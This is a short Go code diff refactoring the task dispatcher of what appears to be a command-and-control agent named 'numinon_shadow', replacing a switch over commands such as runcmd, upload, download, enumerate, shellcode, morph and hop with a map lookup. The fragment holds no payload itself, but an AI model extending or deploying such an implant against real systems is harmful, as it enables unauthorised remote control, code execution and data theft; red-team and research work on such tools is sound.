@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-	"numinon_shadow/internal/agent/command"
 	"numinon_shadow/internal/models"
 )
 
@@ -14,27 +13,22 @@ func (a *Agent) executeTask(task models.ServerTaskResponse) {
 
 	var result models.AgentTaskResult
 
-	switch task.Command {
-	case "runcmd":
-		result = command.HandleRunCmd(task)
-	case "upload":
-		result = command.HandleUpload(task)
-	case "download":
-		result = command.HandleDownload(task)
-	case "enumerate":
-		result = command.HandleEnumerate(task)
-	case "shellcode":
-		result = command.HandleShellcode(task)
-	case "morph":
-		result = command.HandleMorph(task)
-	case "hop":
-		result = command.HandleHop(task)
+	// NEW CODE USING MAP STARTS
 
-	default:
-		log.Printf("|WARN AGENT TASK| Received unknown command: %s", task.Command)
-		result.Status = "error"
-		result.Error = fmt.Sprintf("Unknown command received: %s", task.Command)
+	orchestrator, found := a.commandOrchestrators[task.Command]
+
+	if found {
+		result = orchestrator(a, task)
+	} else {
+		log.Printf("|WARN AGENT TASK| Received unknown command: '%s' (ID: %s)", task.Command, task.TaskID)
+		result = models.AgentTaskResult{
+			TaskID: task.TaskID,
+			Status: models.StatusFailureUnknownCommand,
+			Error:  fmt.Sprintf("Agent does not recognize command: '%s'", task.Command),
+		}
 	}
+
+	// NEW CODE USING MAP ENDS
 
 	// Now marshall the result before sending it back using SendResult
 	resultBytes, err := json.Marshal(result)
